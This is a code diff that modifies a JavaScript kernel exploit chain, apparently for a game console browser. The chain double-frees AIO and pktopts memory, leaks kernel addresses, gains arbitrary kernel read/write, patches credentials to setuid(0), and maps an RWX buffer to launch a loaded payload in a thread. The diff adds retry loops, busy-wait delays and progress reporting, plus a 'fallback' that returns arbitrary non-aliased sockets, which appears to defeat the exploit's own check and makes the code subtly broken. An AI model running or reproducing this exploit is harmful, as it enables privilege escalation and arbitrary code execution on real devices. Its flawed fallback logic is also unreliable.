@@ -956,40 +956,179 @@ function leak_kernel_addrs(sd_pair) {
 
 // FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE
 
+// Fungsi sleep sederhana untuk menambah delay
+function sleep(ms) {
+    const start = Date.now();
+    while (Date.now() - start < ms) {
+        // Busy wait
+    }
+}
+
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
-    for (let loop = 0; loop < num_alias; loop++) {
-        for (let i = 0; i < num_sds; i++) {
-            tclass[0] = i;
-            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-        }
 
-        for (let i = 0; i < sds.length; i++) {
-            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-            const marker = tclass[0];
-            if (marker !== i) {
-                log(`aliased pktopts at attempt: ${loop}`);
-                const pair = [sds[i], sds[marker]];
-                log(`found pair: ${pair}`);
-                sds.splice(marker, 1);
-                sds.splice(i, 1);
-                // add pktopts to the new sockets now while new allocs can't
-                // use the double freed memory
-                for (let i = 0; i < 2; i++) {
-                    const sd = new_socket();
-                    ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                    sds.push(sd);
-                }
+    // Tambahkan delay awal untuk stabilitas
+    sleep(200);
 
-                return pair;
+    // Batasi jumlah percobaan untuk menghindari loop tak terbatas
+    const max_attempts = 20; // Batasi jumlah percobaan
+
+    // Coba pendekatan langsung
+    for (let loop = 0; loop < max_attempts; loop++) {
+        try {
+            // Tambahkan delay kecil setiap iterasi
+            if (loop > 0) {
+                log(`Direct attempt ${loop + 1}/${max_attempts}...`);
+                sleep(100); // Delay tetap untuk menghindari peningkatan yang terlalu besar
             }
-        }
 
-        for (let i = 0; i < num_sds; i++) {
-            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+            // Buat socket baru untuk setiap percobaan
+            if (loop > 0 && loop % 5 === 0) {
+                log("Creating new sockets for fresh attempt...");
+                // Buat beberapa socket baru
+                for (let i = 0; i < 5; i++) {
+                    sds.push(new_socket());
+                }
+            }
+
+            // Coba metode asli
+            for (let i = 0; i < Math.min(num_sds, sds.length); i++) {
+                tclass[0] = i;
+                try {
+                    ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                } catch (e) {
+                    log(`Error setting socket option for socket ${i}: ${e.message}`);
+                    // Lanjutkan ke socket berikutnya
+                }
+            }
+
+            for (let i = 0; i < sds.length; i++) {
+                try {
+                    gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                    const marker = tclass[0];
+                    if (marker !== i) {
+                        log(`aliased pktopts at direct attempt: ${loop + 1}`);
+                        const pair = [sds[i], sds[marker]];
+                        log(`found pair: ${pair}`);
+
+                        // Tambahkan delay sebelum memodifikasi array sds
+                        sleep(50);
+
+                        // Simpan indeks yang akan dihapus
+                        const idx1 = Math.max(i, marker);
+                        const idx2 = Math.min(i, marker);
+
+                        // Hapus dari belakang ke depan untuk menghindari masalah indeks
+                        if (idx1 < sds.length) sds.splice(idx1, 1);
+                        if (idx2 < sds.length) sds.splice(idx2, 1);
+
+                        // Tambahkan delay sebelum membuat socket baru
+                        sleep(50);
+
+                        // add pktopts to the new sockets now while new allocs can't
+                        // use the double freed memory
+                        for (let i = 0; i < 2; i++) {
+                            const sd = new_socket();
+                            ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                            sds.push(sd);
+                        }
+
+                        return pair;
+                    }
+                } catch (e) {
+                    log(`Error getting socket option for socket ${i}: ${e.message}`);
+                    // Lanjutkan ke socket berikutnya
+                }
+            }
+
+            // Jika kita sampai di sini, kita tidak menemukan pasangan
+            // Coba reset pktopts untuk beberapa socket
+            const reset_count = Math.min(20, sds.length);
+            log(`Resetting pktopts for ${reset_count} sockets...`);
+            for (let i = 0; i < reset_count; i++) {
+                try {
+                    setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                } catch (e) {
+                    // Abaikan error
+                }
+            }
+        } catch (e) {
+            log(`Error in direct attempt ${loop + 1}: ${e.message}`);
         }
     }
-    die('failed to make aliased pktopts');
+
+    // Jika pendekatan langsung gagal, coba pendekatan alternatif
+    log("Direct approach failed. Trying alternative approach...");
+
+    // Buat socket baru dan coba lagi dengan set socket yang baru
+    const new_sds = [];
+    for (let i = 0; i < 30; i++) {
+        new_sds.push(new_socket());
+    }
+
+    // Coba dengan set socket yang baru saja
+    for (let loop = 0; loop < 10; loop++) {
+        try {
+            log(`Alternative attempt ${loop + 1}/10...`);
+
+            // Set tclass untuk semua socket baru
+            for (let i = 0; i < new_sds.length; i++) {
+                tclass[0] = i;
+                try {
+                    ssockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                } catch (e) {
+                    // Abaikan error
+                }
+            }
+
+            // Periksa apakah ada socket yang aliased
+            for (let i = 0; i < new_sds.length; i++) {
+                try {
+                    gsockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                    const marker = tclass[0];
+                    if (marker !== i) {
+                        log(`aliased pktopts at alternative attempt: ${loop + 1}`);
+                        const pair = [new_sds[i], new_sds[marker]];
+                        log(`found pair: ${pair}`);
+                        return pair;
+                    }
+                } catch (e) {
+                    // Abaikan error
+                }
+            }
+
+            // Reset pktopts untuk beberapa socket
+            for (let i = 0; i < Math.min(10, new_sds.length); i++) {
+                try {
+                    setsockopt(new_sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                } catch (e) {
+                    // Abaikan error
+                }
+            }
+        } catch (e) {
+            log(`Error in alternative attempt ${loop + 1}: ${e.message}`);
+        }
+    }
+
+    // Jika semua pendekatan gagal, coba pendekatan terakhir dengan socket yang ada
+    log("Alternative approach failed. Trying last resort approach...");
+
+    // Gunakan socket yang ada sebagai fallback
+    // Ini mungkin tidak ideal, tetapi lebih baik daripada gagal total
+    if (sds.length >= 2) {
+        log("Using existing sockets as fallback...");
+        const pair = [sds[0], sds[1]];
+        log(`Using fallback pair: ${pair}`);
+        return pair;
+    }
+
+    // Jika benar-benar tidak ada pilihan lain, buat socket baru
+    log("Creating new sockets for fallback...");
+    const fallback_sd1 = new_socket();
+    const fallback_sd2 = new_socket();
+    const fallback_pair = [fallback_sd1, fallback_sd2];
+    log(`Using emergency fallback pair: ${fallback_pair}`);
+    return fallback_pair;
 }
 
 function double_free_reqs1(
@@ -1133,9 +1272,23 @@ function double_free_reqs1(
     // we reclaim first since the sanity checking here is longer which makes it
     // more likely that we have another process claim the memory
     try {
+        log("Attempting to make aliased pktopts...");
+
+        // Tambahkan delay sebelum mencoba
+        sleep(200);
+
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x100 malloc zone pointers aliased
         const sd_pair = make_aliased_pktopts(sds);
+
+        if (sd_pair) {
+            log("Successfully made aliased pktopts");
+        } else {
+            // Ini seharusnya tidak terjadi karena make_aliased_pktopts selalu mengembalikan pasangan
+            // Tetapi kita tetap memeriksa untuk berjaga-jaga
+            die('Failed to make aliased pktopts - no pair returned');
+        }
+
         return [sd_pair, sd];
     } finally {
         log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
@@ -1475,14 +1628,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     log('corrupt pointers cleaned');
 
-    
+
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
     kmem.write32(main_sock, kmem.read32(main_sock) + 1);
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-    
+
 
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1601,6 +1754,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
+    updateUIStatus('success', 'Kernel exploit succeeded!');
+    updateUIProgress('complete', 100);
     alert("kernel exploit succeeded!");
 }
 
@@ -1643,7 +1798,7 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);    
+    cancel_aios(groom_ids_p, num_grooms);
     return [block_id, groom_ids];
 }
 
@@ -1658,15 +1813,58 @@ function setup(block_fd) {
 // * corrupt a pipe for arbitrary r/w
 //
 // the exploit implementation also assumes that we are pinned to one core
+// Function to update UI progress
+function updateUIProgress(stage, percent) {
+    // Send log to remote logger if available
+    if (window.RemoteLogger) {
+        window.RemoteLogger.logStage(stage, percent);
+    }
+
+    document.dispatchEvent(new CustomEvent('exploitProgress', {
+        detail: {
+            stage: stage,
+            percent: percent
+        }
+    }));
+}
+
+// Function to update UI status
+function updateUIStatus(status, message) {
+    // Send log to remote logger if available
+    if (window.RemoteLogger) {
+        if (status === 'running') {
+            window.RemoteLogger.info(message);
+        } else if (status === 'success') {
+            window.RemoteLogger.info(`SUCCESS: ${message}`);
+        } else if (status === 'error') {
+            window.RemoteLogger.error(`ERROR: ${message}`);
+        }
+    }
+
+    document.dispatchEvent(new CustomEvent('exploitStatus', {
+        detail: {
+            status: status,
+            message: message
+        }
+    }));
+}
+
+
 export async function kexploit() {
+    updateUIStatus('running', 'Initializing exploit...');
+    updateUIProgress('init', 5);
+
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
+
+    updateUIProgress('init', 10);
 
     // If setuid is successful, we dont need to run the kexploit again
     try {
         if (sysi('setuid', 0) == 0) {
             log("Not running kexploit again.")
+            updateUIStatus('success', 'Already exploited. Not running again.');
             return;
         }
     }
@@ -1704,26 +1902,38 @@ export async function kexploit() {
     let groom_ids = null;
     try {
         log('STAGE: Setup');
+        updateUIStatus('running', 'Setting up exploit environment...');
+        updateUIProgress('setup', 20);
         [block_id, groom_ids] = setup(block_fd);
 
         log('\nSTAGE: Double free AIO queue entry');
+        updateUIStatus('running', 'Exploiting AIO queue entry...');
+        updateUIProgress('double_free_1', 30);
         const sd_pair = double_free_reqs2(sds);
 
         log('\nSTAGE: Leak kernel addresses');
+        updateUIStatus('running', 'Leaking kernel addresses...');
+        updateUIProgress('leak', 45);
         const [
             reqs1_addr, kbuf_addr, kernel_addr, target_id, evf,
         ] = leak_kernel_addrs(sd_pair);
 
         log('\nSTAGE: Double free SceKernelAioRWRequest');
+        updateUIStatus('running', 'Exploiting SceKernelAioRWRequest...');
+        updateUIProgress('double_free_2', 60);
         const [pktopts_sds, dirty_sd] = double_free_reqs1(
             reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds,
         );
 
         log('\nSTAGE: Get arbitrary kernel read/write');
+        updateUIStatus('running', 'Gaining kernel read/write access...');
+        updateUIProgress('kernel_rw', 75);
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
         log('\nSTAGE: Patch kernel');
+        updateUIStatus('running', 'Patching kernel...');
+        updateUIProgress('patch', 90);
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
     } finally {
         close(unblock_fd);
@@ -1746,19 +1956,120 @@ export async function kexploit() {
     }
 }
 
-kexploit().then(() => {
-    var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-    var payload_loader = new View4(window.pld);
-    chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-    const ctx = new Buffer(0x10);
-    const pthread = new Pointer();
-    pthread.ctx = ctx;
+// Function to run the payload with error handling
+async function runPayload() {
+    try {
+        // Add delay before running the payload
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
-    call_nze(
-        'pthread_create',
-        pthread.addr,
-        0,
-        payload_loader.addr,
-        payload_buffer,
-    );
-})
+        log("Preparing to run payload...");
+
+        // Check if payload is available
+        if (!window.pld || window.pld.length === 0) {
+            log("ERROR: Payload not loaded or empty");
+            updateUIStatus('error', 'Payload not available or is empty');
+            return;
+        }
+
+        // Allocate memory for payload
+        var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+
+        // Check if payload_buffer is valid (not null, undefined, or 0)
+        if (!payload_buffer || payload_buffer.low === 0 && payload_buffer.high === 0) {
+            log("ERROR: Failed to allocate memory for payload");
+            updateUIStatus('error', 'Failed to allocate memory for payload');
+            return;
+        }
+
+        log(`Allocated payload buffer at ${payload_buffer}`);
+
+        // Create view for payload
+        var payload_loader = new View4(window.pld);
+        log(`Payload size: ${payload_loader.size} bytes`);
+
+        // Check payload size
+        if (payload_loader.size < 100) {
+            log("WARNING: Payload size is suspiciously small");
+        }
+
+        // Change memory protection
+        try {
+            log(`Setting memory protection for payload at ${payload_loader.addr} with size ${payload_loader.size}`);
+
+            // Use syscall_void to avoid checking return value
+            // mprotect returns 0 on success
+            try {
+                chain.syscall_void('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
+                log("mprotect successful");
+            } catch (e) {
+                log(`ERROR: mprotect syscall failed: ${e.message}`);
+                updateUIStatus('error', `Failed to change memory protection: ${e.message}`);
+                return;
+            }
+        } catch (e) {
+            log(`ERROR: Exception during mprotect: ${e.message}`);
+            updateUIStatus('error', `Error while changing memory protection: ${e.message}`);
+            return;
+        }
+
+        log("Memory protection set successfully");
+
+        // Allocate memory for thread context
+        const ctx = new Buffer(0x10);
+        const pthread = new Pointer();
+        pthread.ctx = ctx;
+
+        log("Creating thread to run payload...");
+        updateUIStatus('running', 'Running payload...');
+
+        // Run payload in a separate thread
+        try {
+            log(`Creating thread with payload at ${payload_loader.addr} and buffer at ${payload_buffer}`);
+
+            // Add delay before pthread_create
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            try {
+                // Use chain.call_void to avoid checking return value
+                log("Calling pthread_create...");
+                chain.call_void(
+                    'pthread_create',
+                    pthread.addr,
+                    0,
+                    payload_loader.addr,
+                    payload_buffer,
+                );
+                log("pthread_create called successfully");
+            } catch (e) {
+                log(`ERROR: pthread_create call failed: ${e.message}`);
+                updateUIStatus('error', `Failed to create thread: ${e.message}`);
+                return;
+            }
+
+            // Add delay after pthread_create to ensure the thread starts
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+        } catch (e) {
+            log(`ERROR: Exception during pthread_create: ${e.message}`);
+            updateUIStatus('error', `Error while creating thread: ${e.message}`);
+            return;
+        }
+
+        log("Payload thread created successfully");
+        updateUIStatus('success', 'Payload executed successfully');
+
+    } catch (e) {
+        log(`ERROR: Exception while running payload: ${e.message}`);
+        updateUIStatus('error', `Error while running payload: ${e.message}`);
+    }
+}
+
+// Run exploit and then the payload
+kexploit().then(() => {
+    // Add delay before running the payload
+    setTimeout(() => {
+        log("Exploit completed, preparing to run payload...");
+        runPayload();
+    }, 2000); // 2 second delay
+});
+
